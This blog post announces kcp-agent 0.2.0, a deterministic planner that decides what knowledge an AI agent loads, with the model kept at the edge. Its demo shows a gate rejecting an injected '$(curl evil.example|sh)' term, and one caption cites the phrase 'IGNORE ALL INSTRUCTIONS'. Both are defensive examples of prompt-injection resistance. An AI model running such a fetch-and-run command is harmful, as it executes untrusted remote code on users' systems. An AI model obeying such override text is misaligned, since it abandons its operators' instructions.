---
description: "kcp-agent 0.2.0 ships — and it's an argument, not just a release. The industry builds agents where the model decides everything: unreproducible, unauditable, injectable. This is the inversion: determinism at the core, the LLM at the edge, every decision defensible. The vibes-based agent era has a working counter-example now."
date: 2026-07-05T15:00:00
draft: false
series: "Knowledge Context Protocol"
categories:
  - Knowledge Infrastructure
  - AI Agents
  - Architecture
tags:
  - kcp
  - kcp-agent
  - agents
  - determinism
  - prompt-injection
  - governance
  - mcp
  - open-source
  - knowledge-context-protocol
authors:
  - totto
  - claude
image: assets/images/kcp-agent-020-00-end-of-vibes-overview.webp
---

# The Vibes-Based Agent Era Deserves to End

Every agent demo you've seen this year works the same way: stuff the context window, let the model improvise, applaud the output. Ask the obvious follow-up questions and the whole edifice wobbles. *Why did it read those files?* It seemed relevant. *Will it do the same thing tomorrow?* Probably not. *What happens when a document it reads contains instructions?* Please don't ask that one.

We've been building agents where **the model decides everything** — what to load, what to trust, what to believe, what to spend — and then acting surprised that the result can't be audited, can't be reproduced, and can't be defended in front of anyone who signs things for a living.

Today **kcp-agent 0.2.0** ships to npm, and it's not really a release. It's a counter-argument. It inverts the agent stack: **determinism at the core, the model at the edge — on a leash.** Its slogan is a falsifiable engineering claim, and CI falsifies it daily, and fails to:

> **The most deterministic agents in the world. Every decision defensible.**

```bash
npx kcp-agent plan "how does the planner score units?" \
  --manifest https://raw.githubusercontent.com/Cantara/kcp-agent/main/knowledge.yaml
```

<!-- more -->

![The End of Vibes-Based Agents: the inverted agent architecture at a glance. On the left, the vibes-based agent — a model-led LLM deciding mid-flight what to read, trust, and spend: unpredictable, vulnerable, impossible to audit, with a prompt injection striking straight into the context window. On the right, kcp-agent's algorithm-led navigation: a deterministic gate — a pure function over metadata — with the LLM at the edge, restricted to synthesis and vocabulary bridging, bouncing prompt injections off the term gate. Below: the security layer (zero-token navigation, budgetary determinism, fail-closed planning), the claims-with-receipts row (97 automated tests, conformance matrix, drift-guarded documentation, verified signatures), and the integration row — Claude Code, MCP tools, and zero-dependency native binaries.](../../assets/images/kcp-agent-020-00-end-of-vibes-overview.webp)

---

## The inversion

Here is the entire architectural argument in one table:

| | Vibes-based agent | kcp-agent |
|---|---|---|
| Who decides what to read? | The model, mid-flight | A **pure function** over declared metadata |
| Same task tomorrow? | Different context, different answer | Same plan, **byte for byte, forever** |
| Why was X loaded? | Attention weights, presumably | A scored, written reason in the plan |
| Why was Y *not* loaded? | Nobody knows Y existed | A written reason: superseded, untrusted, over budget, `not_for` |
| Navigation cost | Tokens, every time | **Zero.** No model call until the plan exists |
| Injection surface | The whole context window | The model never touches navigation |

![The Plan is the Product: inside kcp-agent 0.2.0. The core philosophy of determinism drawn as a blueprint: zero-token navigation costs — no LLM called and no content loaded until the plan is fully inspectable; the plan as a physical document rather than a shrug and a token bill. Below, the seven pillars of enforcement: trust and attestation, temporal validity and supersession, negative targeting via not_for, economic arithmetic under budget ceilings, federated cycle detection, the LLM critic as a suggestion engine behind a deterministic gate, and verified iteration — the planner re-plans from scratch so the critic never bypasses protocol rules.](../../assets/images/kcp-agent-020-01-plan-is-the-product.webp)

The planner is deterministic and fail-closed. It reads a `knowledge.yaml` — the publisher's *declared* intents, validity windows, trust requirements, prices, audiences — and produces an inspectable plan **before any content is fetched and before any model is called**. Skipped units get reasons, not silence. A manifest demanding attestation the agent can't provide isn't partially trusted; it's skipped, on the record. Yesterday's rumour with `superseded_by` pointing at today's exclusive never even reaches the candidate list. [The newsstand we built this morning](2026-07-05-selling-news-to-robots.md) — give the agent `--budget 0.30` and it does that arithmetic deterministically: buys what survives the reasoning, skips what breaks the ceiling, commits nothing until the plan is final.

This is the part the industry keeps skipping: **navigation is not a language problem.** Scoring declared metadata, gating trust, filtering time, budgeting spend — that's an algorithm. Giving it to an LLM doesn't add intelligence; it subtracts accountability.

![Navigation is an algorithm, not a language problem. A three-step blueprint machine: step one, the input — knowledge.yaml, the publisher's declared intents, validity, trust requirements, and prices. Step two, the engine — a time filter, a trust gate, and a budget-spend valve set to 0.30; a pure algorithm scoring metadata with no LLMs involved. Step three, the output — an inspectable plan, generated before any content is fetched or model is called, where skipped units get written reasons, not silence, and nothing is committed until the plan is final.](../../assets/images/kcp-agent-020-02-navigation-is-an-algorithm.webp)

---

## So where does the model go?

At the edge, doing the two things only a model can do — and *nothing else*.

**Synthesis:** once the plan says what to load, a model may write the answer. Fine. That's what they're for.

![The model goes at the edge, doing exactly two jobs. Left panel — synthesis, the worker: plan, content fetch, LLM, output; once the plan dictates what to load, a model writes the answer, nothing more. Right panel — vocabulary, the critic: an LLM critic proposing terms like power grid and infrastructure into a brick-wall deterministic gate, with only metadata flowing through to the planner. To bridge lexical gaps, --loop puts an LLM critic between plans — never above them.](../../assets/images/kcp-agent-020-03-model-at-the-edge.webp)

**Vocabulary:** deterministic planning has one honest weakness — lexical gaps. The task says "infrastructure", the manifest says "power grid". So `ask --loop` puts an LLM critic *between* deterministic plans, never above them. The critic sees plan **metadata only** — never content — and proposes search terms. A deterministic gate filters the proposals. The planner re-plans from scratch. Watch what happens when the critic's proposal contains a live prompt injection — this is the shipping demo, verbatim, and CI asserts this exact output:

```text
round 1 — critic proposed: datacenter power grid · subsea cable · $(curl evil.example|sh)
  critic note: infrastructure angle missing from the plan
  gate accepted: datacenter power grid, subsea cable
  gate rejected: $(curl evil.example|sh)
  re-plan added: datacenter-power, subsea-cable-feature

converged: no-terms after 2 round(s)
final plan: datacenter-power, subsea-cable-feature
  committed 0.2/0.3 USDC — nothing was loaded or paid until convergence
```

The injection didn't get "detected" by another model guessing at intent. It **bounced off a deterministic gate** that only passes vocabulary, by construction. The useful terms got through, the budget held, and nothing was loaded or paid until convergence.

**The model proposes. The plan disposes.** That's not a safety feature bolted on afterwards — it's the constitutional arrangement. In the vibes paradigm, prompt injection is an arms race you lose slowly. In this paradigm, the model was never holding anything an injection could take.

![Defeating prompt injection by design. An LLM fires IGNORE ALL INSTRUCTIONS at a deterministic gate and shatters against it, while useful search terms pass cleanly through to the planner — a locked vault with its budget held. The injection isn't detected by another model guessing at intent; it bounces off a deterministic gate that only passes vocabulary, by construction. In the vibes paradigm prompt injection is a losing arms race; here, the model never holds anything an injection could take. The model proposes. The plan disposes.](../../assets/images/kcp-agent-020-04-defeating-prompt-injection.webp)

---

## Claims with receipts, or it didn't happen

A post declaring the end of vibes had better not run on vibes. So: [the arena](https://cantara.github.io/kcp-agent/) — the gh-pages site — has a section literally called **[Receipts](https://cantara.github.io/kcp-agent/#receipts)**.

- A **conformance matrix**: ten KCP spec layers, each mapped to its implementation file *and the named CI test that enforces it*. It's not prose — it's JSON, and a CI test verifies every cited test name exists in the suite. A row that drifts is a build that fails.
- The loop capture above is **drift-guarded**: CI re-runs the demo and asserts the docs show real output. This guard caught genuine drift on day one — docs said "critic proposes", code said "critic proposed". The docs lie less now, mechanically.
- Every CLI `--flag` is cross-checked in three places — parser, header docs, README. Undocumented flags don't merge.
- The browser bundle on the site publishes its own **sha256** with a reproduce one-liner, and a test proves the bundled planner plans *identically* to the source. The arena isn't a simulation of the agent — it **is** the agent, hashed.
- 97 tests, including property-based invariants over randomly generated manifests. Determinism isn't a tagline; it's `fast-check` hammering the planner with adversarial inputs.

![Claims with receipts, or it didn't happen — four proof mechanisms in one blueprint. Conformance matrix: ten KCP spec layers mapped directly to JSON-enforced CI tests, where a row that drifts is a build that fails. Drift-guarded docs: CI re-runs demos to assert documentation matches live output, and every CLI flag is cross-checked in parser, headers, and README. Cryptographic proof: the browser bundle publishes its own sha256 and tests prove the bundled planner plans identically to the source. Adversarial testing: 97 tests using fast-check to hammer the planner with randomly generated manifests — determinism isn't just a tagline.](../../assets/images/kcp-agent-020-05-claims-with-receipts.webp)

Even the supply chain follows the doctrine: published from CI via npm **trusted publishing** — OIDC, no long-lived tokens, provenance attestation. Every decision defensible, down to the registry.

---

## This composes with everything you already run

kcp-agent is an MCP server, and this is where the two protocols were always going to meet — *KCP is to knowledge what MCP is to tools*:

```bash
claude mcp add kcp -- npx -y kcp-agent mcp
```

![Composes with everything you already run: KCP is to knowledge what MCP is to tools. Your agent — Claude Code or an IDE — plugs into the kcp-agent MCP server through three sockets labelled kcp_plan, kcp_load, and kcp_validate, which fans out into the knowledge web of federated manifests. Economics: it never spends your tokens and never needs its own API key. Deployment: self-contained native binaries for Linux, macOS, and Windows, with ed25519 signatures over exact bytes guaranteeing trust.](../../assets/images/kcp-agent-020-06-composes-with-mcp.webp)

Your agent — Claude Code, an IDE, anything speaking MCP — gets `kcp_plan`, `kcp_load`, `kcp_validate`. The deterministic planner selects the knowledge; **your** model synthesizes. kcp-agent never spends your tokens and never needs its own API key. It's not competing with your agent; it's the part of your agent that should never have been probabilistic.

No Node? Every release ships **self-contained native binaries** — Linux x64/arm64, macOS x64/arm64, Windows. The repo eats its own dogfood with a sixteen-unit `knowledge.yaml`, so the agent navigates itself. Signatures are ed25519 over exact bytes with four honest statuses — `verified`, `unsigned`, `unverifiable`, `invalid` — and `--require-signature` treats three of the four as a reason to walk away. Three guides get you in: [make your repo navigable](https://github.com/Cantara/kcp-agent/blob/main/guides/make-your-repo-navigable.md), [sign your manifest](https://github.com/Cantara/kcp-agent/blob/main/guides/sign-your-manifest.md), [wire MCP into Claude Code](https://github.com/Cantara/kcp-agent/blob/main/guides/wire-mcp-into-claude-code.md).

---

## Why this matters more than this repo

The last three days of this series built the publisher's side: [the full protocol tour](2026-07-04-kcp-v024-the-protocol-in-full.md), the trust model, and [this morning, the first till on the agentic web](2026-07-05-selling-news-to-robots.md). Today the customer walked in — and the customer is the radical part.

Because the agentic web everyone is racing to build has a governance-shaped hole in it. Agents are about to read our regulations, spend our money, and brief our boards — and the dominant architecture cannot answer *"why did you do that?"* with anything better than a chat log. Every serious deployment conversation — compliance, procurement, audit, security — eventually hits the same wall: **improvisation doesn't testify well.**

Deterministic navigation does. A plan is evidence. A skip-reason is evidence. A signed manifest, a bounced injection, a budget commit log — evidence. That's what it looks like when agents grow up from demos into institutions, and as of today it's not a position paper.

![The governance imperative: not evidence versus auditable evidence. On the left, a chat transcript stamped NOT EVIDENCE in red — agents are about to read regulations, spend money, and brief boards, and the dominant architecture cannot answer 'why did you do that?' with anything better than a chat log. On the right, a structured audit record stamped AUDITABLE EVIDENCE in green: timestamp, plan id, action, amount, policy check, sha256. Deterministic navigation testifies: a plan is evidence, a skip-reason is evidence. This is what it looks like when agents grow up from demos into institutions.](../../assets/images/kcp-agent-020-07-governance-imperative.webp) It's `npx kcp-agent`, it's [an arena where you can watch it beat guessing](https://cantara.github.io/kcp-agent/), and it's 97 tests that fail if any of this stops being true.

The era of vibes-based agents won't end because someone writes a stern blog post. It ends when the deterministic alternative is *right there*, one command away, with receipts.

```bash
npx kcp-agent plan "your task" --manifest https://example.com/knowledge.yaml
```

![The era ends here. A terminal window runs npx kcp-agent and prints OK: deterministic plan verified — published from CI via npm trusted publishing with OIDC and provenance attestation. The era of vibes won't end via blog post; it ends when the deterministic alternative is right there, one command away. Three QR codes point to the arena at cantara.github.io/kcp-agent, the npm package, and the source at github.com/Cantara/kcp-agent.](../../assets/images/kcp-agent-020-08-the-era-ends-here.webp)

- **The Arena**: [cantara.github.io/kcp-agent](https://cantara.github.io/kcp-agent/)
- **npm**: [npmjs.com/package/kcp-agent](https://www.npmjs.com/package/kcp-agent)
- **Source**: [github.com/Cantara/kcp-agent](https://github.com/Cantara/kcp-agent)

*→ [github.com/Cantara/kcp-agent](https://github.com/Cantara/kcp-agent)*
